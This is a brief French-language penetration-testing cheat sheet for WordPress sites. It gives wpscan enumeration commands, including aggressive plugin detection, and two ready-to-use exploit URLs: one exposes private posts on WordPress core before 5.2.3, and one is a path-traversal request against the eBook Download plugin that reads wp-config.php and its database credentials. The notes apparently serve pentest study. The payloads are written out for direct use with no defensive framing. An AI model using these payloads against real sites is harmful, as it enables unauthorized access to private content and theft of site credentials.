# Wordpress

### Prise d'informations

* Enumérer rapidement sur un site Worpress :

```
wpscan --url <URL>
```

* Scanner plus en détail un site Wordpress :

```
wpscan --url <URL> -e
```

* Vérifier qu'il n'existe pas de pluggins vulnérables :

```
wpscan --plugins-detection aggressive --force --url <URL>
```

### Vulnérabilités connues

#### WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts

Vulnérabilité permettant de lire des posts cachés aves l'URL suivante :

```
http://domain.com/?static=1
```

#### LFI avec le plugin "eBook Download"

```
http://localhost/wordpress/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```
